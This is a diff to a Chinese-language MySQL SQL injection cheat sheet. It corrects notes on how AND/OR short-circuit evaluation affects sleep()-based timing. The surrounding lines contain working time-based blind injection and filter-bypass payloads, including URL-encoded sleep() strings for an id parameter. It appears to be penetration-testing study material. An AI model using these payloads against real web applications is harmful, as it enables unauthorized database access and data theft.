@@ -48,7 +48,10 @@ AND或OR后面可以跟的字符:
 40 @  
 例子：`SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))`  
 dual 是一个虚拟表，可以用来做测试。  
-注意：where a_exp or b_exp 中即使 a_exp is true 也是会计算 b_exp 的；在没有加() 等其他符号时， and 和 or 一起出现先计算 and，为了绕过对 and / or 的过滤，可以使用 rlike 等关键字，比如 `where 11=11 rlike sleep(10)#`。   
+注意：  
+where a_exp or b_exp 中如果 a_exp is true 是不会计算 b_exp 的，如果 a_exp is false，那 b_exp 执行且执行的次数跟表的条目有关，即如果 b_exp 是 sleep(2)，而表有3个条目，将睡眠6s 后返回。    
+where a_exp and b_exp 中如果 a_exp is false 是不会计算 b_exp 的，如果 a_exp is true，那 b_exp 执行且执行的次数跟表的条目有关，即如果 b_exp 是 sleep(2)，而表有3个条目，将睡眠6s 后返回。     
+在没有加() 等其他符号时， and 和 or 一起出现先计算 and，为了绕过对 and / or 的过滤，可以使用 rlike 等关键字，比如 `where 11=11 rlike sleep(10)#`。     
 `?id=1%27%20AnD%201=2%20OR%20if(now()%3dsysdate()%2csleep(3)%2c0)%20And%20%271%27=%271`  
 
 查询information_schema(>=5.0 才存在,mysql5.0以下需要字典猜表)、mysql 数据库的信息(需要root权限，表名、列名、对应权限等)  
@@ -168,7 +171,7 @@ Sleep for supplied seconds.
 `SELECT sleep(10); `  
 Sleep 10 seconds.  
 `and%20(select*from(select(sleep(10)))a)--`  
-注意 sleep/benchmark 函数执行完返回值是 0，故 if(now()=sysdate(),sleep(duration),0) 返回值肯定是0  
+注意 sleep/benchmark 函数执行完返回值是 0，故 if(now()=sysdate(),sleep(duration),0) 返回值肯定是0。    
 
 #### More Timing in MySQL
 `select benchmark( 500000, sha1( 'test' ) );`  
